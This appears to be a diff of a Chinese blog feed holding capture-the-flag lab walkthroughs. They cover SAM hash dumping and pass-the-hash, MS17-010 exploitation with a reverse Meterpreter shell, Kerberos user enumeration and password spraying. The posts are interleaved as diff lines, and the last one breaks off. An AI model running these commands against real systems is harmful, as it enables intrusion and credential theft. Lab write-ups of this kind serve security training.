+-a----        12/5/2024   9:05 PM          36864 sam.hive
+-a----        12/5/2024   9:05 PM        9945088 system.hive
+
+<br>然后下载到kali<br>*Evil-WinRM* PS C:\Users\TEMP.bbr\Documents&gt; download sam.hive
+
+Info: Downloading C:\Users\TEMP.bbr\Documents\sam.hive to sam.hive
+
+Info: Download successful!
+*Evil-WinRM* PS C:\Users\TEMP.bbr\Documents&gt; download system.hive
+
+Info: Downloading C:\Users\TEMP.bbr\Documents\system.hive to system.hive
+
+Info: Download successful!
+
+<br>使用 impacket-secretsdump 从注册表转储文件中获取 ntlm 哈希<br>┌──(root㉿kali)-[/home/kali/thl/BIG]
+└─# impacket-secretsdump -sam sam.hive -system system.hive LOCAL
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+[*] Target system bootKey: 0xbb33617256ea48219d9d3d01766b7a9e
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:bb1c50a48c37e053d2045cd5b55cd2f2:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[*] Cleaning up...
+
+
+<br>获取到管理员的哈希，PTH传递 登录上去<br>evil-winrm -i 192.168.212.4 -u administrator -H 5d48bcf84aea999fb1ade06970a81237
+
+*Evil-WinRM* PS C:\users\music\documents&gt; type user.txt
+53bdf70c03ad626fe7a17ba5a9495b3a
+
+*Evil-WinRM* PS C:\Users\Administrator\documents&gt; type root.txt
+8e824f6e933f0b62616aa54d75416184
+
+<br>
+这里有点问题。 我们获取到的hash是bb1c50a48c37e053d2045cd5b55cd2f2<br>
+但是等不上去。 正确的hash是5d48bcf84aea999fb1ade06970a81237
+<br>看了一下wp。<br>
+5d48bcf84aea999fb1ade06970a81237 的来源是看的这个 <a data-tooltip-position="top" aria-label="http://www.vxer.cn/2024/11/12/thehackerslabs-big-walkthrough/?unapproved=93&amp;moderation-hash=b2958a09da2185b9e9173703b0165341#comment-93" rel="noopener nofollow" class="external-link" href="http://www.vxer.cn/2024/11/12/thehackerslabs-big-walkthrough/?unapproved=93&amp;moderation-hash=b2958a09da2185b9e9173703b0165341#comment-93" target="_blank">wp</a> <br>而且官方下面的 <a data-tooltip-position="top" aria-label="https://curiosidadesdehackers.com/resolucion-de-la-maquina-b-i-g/" rel="noopener nofollow" class="external-link" href="https://curiosidadesdehackers.com/resolucion-de-la-maquina-b-i-g/" target="_blank">wp</a> 用的又是 bb1c50a48c37e053d2045cd5b55cd2f2 登上去的<br>我猜测可能是用户改变导致的<br>
+<img alt="Pasted image 20241205212440" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241205212440.png" referrerpolicy="no-referrer">]]></description><link>https://www.c1trus.top/24-渗透/thl/4.big.html</link><guid isPermaLink="false">24-渗透/THL/4.BIG.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/big1.jpg" length="0" type="image/jpeg"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/big1.jpg"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[3.Doraemon]]></title><description><![CDATA[ 
+ <br><br>
+<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
+<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
+<br><a data-tooltip-position="top" aria-label="3. MS17-010" data-href="#3. MS17-010" href="https://www.c1trus.top/about:blank#3._MS17-010" class="internal-link" target="_self" rel="noopener nofollow">3. MS17-010</a><br>
+靶机链接  <a rel="noopener nofollow" class="external-link" href="https://thehackerslabs.com/doraemon/" target="_blank">https://thehackerslabs.com/doraemon/</a><br>
+难度 ⭐️️
+<br><br>┌──(root㉿kali)-[/home/kali/thl/doraemon]
+└─#  fscan -h 192.168.10.5
+
+   ___                              _
+  / _ \     ___  ___ _ __ __ _  ___| | __
+ / /_\/____/ __|/ __| '__/ _`' |/ __| |/ /
+/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
+\____/     |___/\___|_|  \__,_|\___|_|\_\
+                     fscan version: 1.8.4
+start infoscan
+192.168.10.5:139 open
+192.168.10.5:445 open
+192.168.10.5:135 open
+192.168.10.5:88 open
+[*] alive ports len is: 4
+start vulscan
+[*] NetInfo
+[*]192.168.10.5
+   [-&gt;]WIN-VRU3GG3DPLJ
+   [-&gt;]192.168.10.5
+[+] MS17-010 192.168.10.5       (Windows Server 2016 Datacenter 14393)
+[*] NetBios 192.168.10.5    [+] DC:WIN-VRU3GG3DPLJ.DORAEMON.THL      ▒Windows Server 2016 Datacenter 14393
+已完成 4/4
+[*] 扫描结束,耗时: 1.017942284s
+
+<br>域名 DORAEMON.THL<br>
+DC  WIN-VRU3GG3DPLJ.DORAEMON.THL<br>先配hosts<br><br>发现有ms17-010<br>
+看看能不能用、直接梭哈<br>msfconsole
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.10.5
+set lhost 192.168.10.3
 run
 
-c:\Users\MIKE\Desktop&gt;type root.txt
-type root.txt
-1682c7160e3855a6685316efb97ce451
+msf6 exploit(windows/smb/ms17_010_psexec) &gt; run
 
-c:\Users\MIKE\Desktop&gt;type user.txt
-type user.txt
-c4fa8bfbc9855acfced6a56a7da3156e
-]]></description><link>https://www.c1trus.top/24-渗透/vulnyx/2.eternal.html</link><guid isPermaLink="false">24-渗透/Vulnyx/2.Eternal.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate></item><item><title><![CDATA[1.Experience]]></title><description><![CDATA[ 
+[*] Started reverse TCP handler on 192.168.10.3:4444
+[*] 192.168.10.5:445 - Target OS: Windows Server 2016 Datacenter 14393
+[*] 192.168.10.5:445 - Built a write-what-where primitive...
+[+] 192.168.10.5:445 - Overwrite complete... SYSTEM session obtained!
+[*] 192.168.10.5:445 - Selecting PowerShell target
+[*] 192.168.10.5:445 - Executing the payload...
+[+] 192.168.10.5:445 - Service start timed out, OK if running a command or non-service executable...
+[*] Sending stage (177734 bytes) to 192.168.10.5
+[*] Meterpreter session 1 opened (192.168.10.3:4444 -&gt; 192.168.10.5:49724) at 2024-12-05 15:23:39 +0800
+
+meterpreter &gt; shell
+Process 1124 created.
+Channel 1 created.
+Microsoft Windows [Versi▒n 10.0.14393]
+(c) 2016 Microsoft Corporation. Todos los derechos reservados.
+
+C:\Windows\system32&gt;whoami
+whoami
+nt authority\system
+
+<br>这应该是拿下了吧<br>c:\Users\Administrador\Desktop&gt;type root.txt
+type root.txt
+advcrfbuiwergvb78wer9hg3n4sdfs43
+
+c:\Users&gt;type Suneo\desktop\user.txt
+type Suneo\desktop\user.txt
+asfre6vcergv3bvfsiregvrtetgb9rnwn543
+
+]]></description><link>https://www.c1trus.top/24-渗透/thl/3.doraemon.html</link><guid isPermaLink="false">24-渗透/THL/3.Doraemon.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate></item><item><title><![CDATA[2.Pacharan]]></title><description><![CDATA[ 
  <br><br>
 <br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
 <br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
-<br><a data-tooltip-position="top" aria-label="3. ms17-010" data-href="#3. ms17-010" href="https://www.c1trus.top/about:blank#3._ms17-010" class="internal-link" target="_self" rel="noopener nofollow">3. ms17-010</a><br>
+<br><a data-tooltip-position="top" aria-label="3. smb空会话检测" data-href="#3. smb空会话检测" href="https://www.c1trus.top/about:blank#3._smb空会话检测" class="internal-link" target="_self" rel="noopener nofollow">3. smb空会话检测</a>
+<br><a data-tooltip-position="top" aria-label="4. Kerbrute force" data-href="#4. Kerbrute force" href="https://www.c1trus.top/about:blank#4._Kerbrute_force" class="internal-link" target="_self" rel="noopener nofollow">4. Kerbrute force</a>
+<br><a data-tooltip-position="top" aria-label="5. 密码喷涂" data-href="#5. 密码喷涂" href="https://www.c1trus.top/about:blank#5._密码喷涂" class="internal-link" target="_self" rel="noopener nofollow">5. 密码喷涂</a>
+<br><a data-tooltip-position="top" aria-label="6. Orujo利用" data-href="#6. Orujo利用" href="https://www.c1trus.top/about:blank#6._Orujo利用" class="internal-link" target="_self" rel="noopener nofollow">6. Orujo利用</a>
+<br><a data-tooltip-position="top" aria-label="7. Whisky用户利用" data-href="#7. Whisky用户利用" href="https://www.c1trus.top/about:blank#7._Whisky用户利用" class="internal-link" target="_self" rel="noopener nofollow">7. Whisky用户利用</a>
+<br><a data-tooltip-position="top" aria-label="8. CVE-2021-34527 提权到系统用户" data-href="#8. CVE-2021-34527 提权到系统用户" href="https://www.c1trus.top/about:blank#8._CVE-2021-34527_提权到系统用户" class="internal-link" target="_self" rel="noopener nofollow">8. CVE-2021-34527 提权到系统用户</a>
+<br><a data-tooltip-position="top" aria-label="9. 方式2： SeLoadDriverPrivilege权限提权到系统" data-href="#9. 方式2： SeLoadDriverPrivilege权限提权到系统" href="https://www.c1trus.top/about:blank#9._方式2：_SeLoadDriverPrivilege权限提权到系统" class="internal-link" target="_self" rel="noopener nofollow">9. 方式2： SeLoadDriverPrivilege权限提权到系统</a><br>
 靶机链接<br>
-难度 ⭐️️
-<br><br>┌──(root㉿kali)-[~/Desktop/vulnyx/Experience]
-└─# fscan -h 192.168.56.17
+难度 ⭐️⭐️⭐️⭐️️
+<br><br>┌──(root㉿kali)-[/home/kali/thl/Pacharan]
+└─# fscan -h 192.168.69.69
+
+   ___                              _
+  / _ \     ___  ___ _ __ __ _  ___| | __
+ / /_\/____/ __|/ __| ''__/ _ |/ __| |/ /
+/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
+\____/     |___/\___|_|  \__,_|\___|_|\_\
+                     fscan version: 1.8.4
+start infoscan
+192.168.69.69:445 open
+192.168.69.69:88 open
+192.168.69.69:139 open
+192.168.69.69:135 open
+[*] alive ports len is: 4
+start vulscan
+[*] NetBios 192.168.69.69   [+] DC:PACHARAN\WIN-VRU3GG3DPLJ
+[*] NetInfo
+[*]192.168.69.69
+   [-&gt;]WIN-VRU3GG3DPLJ
+   [-&gt;]192.168.69.69
+已完成 4/4
+[*] 扫描结束,耗时: 1.128075052s
+
+┌──(root㉿kali)-[/home/kali/thl/Pacharan]
+└─# nmap -sC -sV 192.168.69.69
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-04 14:51 CST
+Nmap scan report for 192.168.69.69
+Host is up (0.00014s latency).
+Not shown: 989 closed tcp ports (reset)
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-04 13:51:20Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: PACHARAN.THL, Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: PACHARAN.THL, Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+MAC Address: 08:00:27:7A:01:8C (Oracle VirtualBox virtual NIC)
+Service Info: Host: WIN-VRU3GG3DPLJ; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 6h59m57s
+|_nbstat: NetBIOS name: WIN-VRU3GG3DPLJ, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:7a:01:8c (Oracle VirtualBox virtual NIC)
+| smb2-security-mode:
+|   3:1:1:
+|_    Message signing enabled and required
+| smb2-time:
+|   date: 2024-12-04T13:51:20
+|_  start_date: 2024-12-04T13:48:49
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 21.06 seconds
+
+<br>域名 PACHARAN.THL<br>
+配一下hsots<br><br>┌──(root㉿kali)-[/home/kali/thl/Pacharan]
+└─# smbmap -u anonymous -H 192.168.69.69
+
+    ________  ___      ___  _______   ___      ___       __         _______
+   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
+  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
+    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
+   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
+  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
+ -----------------------------------------------------------------------------
+     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
+                     https://github.com/ShawnDEvans/smbmap
+
+[*] Detected 1 hosts serving SMB
+[*] Established 1 SMB session(s)
+
+[+] IP: 192.168.69.69:445       Name: PACHARAN.THL              Status: Authenticated
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Admin remota
+        C$                                                      NO ACCESS       Recurso predeterminado
+        IPC$                                                    READ ONLY       IPC remota
+        NETLOGON                                                NO ACCESS       Recurso compartido del servidor de inicio de sesión
+        NETLOGON2                                               READ ONLY
+        PACHARAN                                                NO ACCESS
+        PDF Pro Virtual Printer                                 NO ACCESS       Soy Hacker y arreglo impresoras
+        print$                                                  NO ACCESS       Controladores de impresora
+        SYSVOL                                                  NO ACCESS       Recurso compartido del servidor de inicio de sesión
+        Users                                                   NO ACCESS
+<br>┌──(root㉿kali)-[/home/kali/thl/Pacharan]
+└─# smbclient -U anonymous   //192.168.69.69/NETLOGON2
+Password for [WORKGROUP\anonymous]:
+Try "help" to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Thu Aug  1 01:25:34 2024
+  ..                                  D        0  Thu Aug  1 01:25:34 2024
+  Orujo.txt                           A       22  Thu Aug  1 01:25:55 2024
+
+                7735807 blocks of size 4096. 4713743 blocks available
+smb: \&gt; get Orujo.txt
+getting file \Orujo.txt of size 22 as Orujo.txt (10.7 KiloBytes/sec) (average 10.7 KiloBytes/sec)
+smb: \&gt; exit
+
+
+┌──(root㉿kali)-[/home/kali/thl/Pacharan]
+└─# cat Orujo.txt
+Pericodelospalotes6969   
+<br>获取到两个关键字符串<br>
+Pericodelospalotes6969<br>
+Orujo<br><br>┌──(root㉿kali)-[/home/kali/thl/Pacharan]
+└─# kerbrute userenum -d PACHARAN.THL --dc 192.168.69.69 /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
+
+    __             __               __
+   / /_____  _____/ /_  _______  __/ /____
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/
+
+Version: v1.0.3 (9dad6e1) - 12/04/24 - Ronnie Flathers @ropnop
+
+2024/12/04 15:01:42 &gt;  Using KDC(s):
+2024/12/04 15:01:42 &gt;   192.168.69.69:88
+
+2024/12/04 15:01:42 &gt;  [+] VALID USERNAME:       chivas@PACHARAN.THL
+2024/12/04 15:01:44 &gt;  [+] VALID USERNAME:       hendrick@PACHARAN.THL
+2024/12/04 15:01:44 &gt;  [+] VALID USERNAME:       whisky@PACHARAN.THL
+2024/12/04 15:01:44 &gt;  [+] VALID USERNAME:       gordons@PACHARAN.THL
+2024/12/04 15:01:46 &gt;  [+] VALID USERNAME:       redlabel@PACHARAN.THL
+2024/12/04 15:01:47 &gt;  [+] VALID USERNAME:       beefeater@PACHARAN.THL
+2024/12/04 15:01:47 &gt;  [+] VALID USERNAME:       Chivas@PACHARAN.THL
+2024/12/04 15:01:49 &gt;  [+] VALID USERNAME:       invitado@PACHARAN.THL
+2024/12/04 15:02:06 &gt;  [+] VALID USERNAME:       administrador@PACHARAN.THL
+2024/12/04 15:06:35 &gt;  [+] VALID USERNAME:       carlosv@PACHARAN.THL
+2024/12/04 15:07:19 &gt;  [+] VALID USERNAME:       Whisky@PACHARAN.THL
+2024/12/04 15:07:26 &gt;  [+] VALID USERNAME:       RedLabel@PACHARAN.THL
+2024/12/04 15:07:41 &gt;  [+] VALID USERNAME:       GordonS@PACHARAN.THL
+2024/12/04 15:07:42 &gt;  [+] VALID USERNAME:       GINEBRA@PACHARAN.THL
+2024/12/04 15:07:48 &gt;  [+] VALID USERNAME:       CarlosV@PACHARAN.THL
+2024/12/04 15:07:49 &gt;  [+] VALID USERNAME:       CHIVAS@PACHARAN.THL
+2024/12/04 15:07:50 &gt;  [+] VALID USERNAME:       Beefeater@PACHARAN.THL
+2024/12/04 15:08:03 &gt;  Done! Tested 8295455 usernames (17 valid) in 380.478 seconds
+
+┌──(root㉿kali)-[/home/kali/thl/Pacharan]
+└─# cat kerbrute_users.txt|cut -d ' ' -f14|cut -d '@' -f1&gt;valid_users.txt
+
+┌──(root㉿kali)-[/home/kali/thl/Pacharan]
+└─# cat valid_users.txt
+chivas
+hendrick
+whisky
+gordons
+redlabel
+beefeater
+Chivas
+invitado
+administrador
+carlosv
+Whisky
+RedLabel
+GordonS
+GINEBRA
+CarlosV
+CHIVAS
+Beefeater
+
+<br>把上面获取到的字符串也加进去 Pericodelospalotes6969 Orujo<br><br>┌──(root㉿kali)-[/home/kali/thl/Pacharan]
+└─# crackmapexec smb PACHARAN.THL -u valid_users.txt -p valid_users.txt --continue-on-success
+SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:PACHARAN.THL) (signing:True) (SMBv1:False)
+
+SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Pericodelospalotes6969:chivas
+SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Pericodelospalotes6969:hendrick
+SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Pericodelospalotes6969:whisky
+SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Pericodelospalotes6969:gordons
+SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Pericodelospalotes6969:redlabel
+SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Pericodelospalotes6969:beefeater
+SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Pericodelospalotes6969:Chivas
+SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Pericodelospalotes6969:invitado
+SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Pericodelospalotes6969:administrador
+SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Pericodelospalotes6969:carlosv
+SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Pericodelospalotes6969:Whisky
+SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Pericodelospalotes6969:RedLabel
+SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Pericodelospalotes6969:GordonS
+SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Pericodelospalotes6969:GINEBRA
+SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Pericodelospalotes6969:CarlosV
+SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Pericodelospalotes6969:CHIVAS
+SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Pericodelospalotes6969:Beefeater
+SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Pericodelospalotes6969:Pericodelospalotes6969
+SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Pericodelospalotes6969:Orujo
+SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Orujo:chivas STATUS_LOGON_FAILURE
+SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Orujo:hendrick STATUS_LOGON_FAILURE
+SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Orujo:whisky STATUS_LOGON_FAILURE
+SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Orujo:gordons STATUS_LOGON_FAILURE
+SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Orujo:redlabel STATUS_LOGON_FAILURE
+SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Orujo:beefeater STATUS_LOGON_FAILURE
+SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Orujo:Chivas STATUS_LOGON_FAILURE
+SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Orujo:invitado STATUS_LOGON_FAILURE
+SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Orujo:administrador STATUS_LOGON_FAILURE
+SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Orujo:carlosv STATUS_LOGON_FAILURE
+SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Orujo:Whisky STATUS_LOGON_FAILURE
+SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Orujo:RedLabel STATUS_LOGON_FAILURE
+SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Orujo:GordonS STATUS_LOGON_FAILURE
+SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Orujo:GINEBRA STATUS_LOGON_FAILURE
+SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Orujo:CarlosV STATUS_LOGON_FAILURE
+SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Orujo:CHIVAS STATUS_LOGON_FAILURE
+SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Orujo:Beefeater STATUS_LOGON_FAILURE
+SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Orujo:Pericodelospalotes6969
+SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Orujo:Orujo STATUS_LOGON_FAILURE
+
+
+<br>可以看到 Pericodelospalotes6969 用户是不需要密码的<br>
+尝试利用 evil-winrm 登录该用户 <br>┌──(root㉿kali)-[/home/kali/thl/Pacharan]
+└─# evil-winrm -i 192.168.69.69 -u Pericodelospalotes6969 -p Per
+
+Evil-WinRM shell v3.5
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
+
+Error: Exiting with code 1
+
+<br>失败了<br>还有一个用户<br>
+Orujo ：Pericodelospalotes6969 <br>┌──(root㉿kali)-[/home/kali/thl/Pacharan]
+└─# evil-winrm -i 192.168.69.69 -u Orujo -p Pericodelospalotes6969
+
+Evil-WinRM shell v3.5
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
+
+Error: Exiting with code 1
+
+<br>好吧也不行<br><br>看一下Orujo用户的smb共享<br>┌──(root㉿kali)-[/home/kali/thl/Pacharan]
+└─# smbmap -u Orujo -p Pericodelospalotes6969 -H 192.168.69.69
+
+    ________  ___      ___  _______   ___      ___       __         _______
+   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
+  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
+    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
+   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
+  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
+ -----------------------------------------------------------------------------
+     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
+                     https://github.com/ShawnDEvans/smbmap
+
+[*] Detected 1 hosts serving SMB
+[*] Established 1 SMB session(s)
+
+[+] IP: 192.168.69.69:445       Name: PACHARAN.THL              Status: Authenticated
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Admin remota
+        C$                                                      NO ACCESS       Recurso predeterminado
+        IPC$                                                    READ ONLY       IPC remota
+        NETLOGON                                                READ ONLY       Recurso compartido del servidor de inicio de sesión
+        NETLOGON2                                               NO ACCESS
+        PACHARAN                                                READ ONLY
+        PDF Pro Virtual Printer                                 NO ACCESS       Soy Hacker y arreglo impresoras
+        print$                                                  NO ACCESS       Controladores de impresora
+        SYSVOL                                                  NO ACCESS       Recurso compartido del servidor de inicio de sesión
+        Users                                                   NO ACCESS
+
+<br>┌──(root㉿kali)-[/home/kali/thl/Pacharan]
+└─# smbclient -U Orujo  //192.168.69.69/PACHARAN
+Password for [WORKGROUP\Orujo]:
+Try "help" to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Thu Aug  1 01:21:13 2024
+  ..                                  D        0  Thu Aug  1 01:21:13 2024
+  ah.txt                              A      921  Thu Aug  1 01:20:16 2024
+
+                7735807 blocks of size 4096. 4712894 blocks available
+┌──(root㉿kali)-[/home/kali/thl/Pacharan]
+└─# cat ah.txt
+Mamasoystreamer1!
+Mamasoystreamer2@
+Mamasoystreamer3#
+Mamasoystreamer4$
+Mamasoystreamer5%
+Mamasoystreamer6^
+Mamasoystreamer7&amp;
+Mamasoystreamer8*
+Mamasoystreamer9(
+Mamasoystreamer10)
+MamasoyStreamer11!
+MamasoyStreamer12@
+MamasoyStreamer13#
+MamasoyStreamer14$
+MamasoyStreamer15%
+MamasoyStreamer16^
+MamasoyStreamer17&amp;
+MamasoyStreamer18*
+MamasoyStreamer19(
+MamasoyStreamer20)
+MamaSoyStreamer1!
+MamaSoyStreamer2@
+MamaSoyStreamer3#
+MamaSoyStreamer4$
+MamaSoyStreamer5%
+MamaSoyStreamer6^
+MamaSoyStreamer7&amp;
+MamaSoyStreamer8*
+MamaSoyStreamer9(
+MamaSoyStreamer10)
+MamasoyStream1er!
+MamasoyStream2er@
+MamasoyStream3er#
+MamasoyStream4er$
+MamasoyStream5er%
+MamasoyStream6er^
+MamasoyStream7er&amp;
+MamasoyStream8er*
+MamasoyStream9er(
+MamasoyStream10er)
+MamasoyStr1amer!
+MamasoyStr2amer@
+MamasoyStr3amer#
+MamasoyStr4amer$
+MamasoyStr5amer%
+MamasoyStr6amer^
+MamasoyStr7amer&amp;
+MamasoyStr8amer*
+MamasoyStr9amer(
+MamasoyStr10amer)
+Mamasoystreamer1
+
+<br>看这像是一个密码表<br><br>┌──(root㉿kali)-[/home/kali/thl/Pacharan]
+└─# crackmapexec smb PACHARAN.THL -u valid_users.txt -p ah.txt --continue-on-success |grep +
+SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\whisky:MamasoyStream2er@
+SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Whisky:MamasoyStream2er@
+
+<br>成功获取到了 Whisky 用户的密码<br>
+尝试evil -winrm登录<br>
+┌──(root㉿kali)-[/home/kali/thl/Pacharan]
+└─# evil-winrm -i 192.168.69.69 -u 'Whisky' -p 'MamasoyStream2er@'
+
+Evil-WinRM shell v3.5
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
+
+Error: Exiting with code 1
+
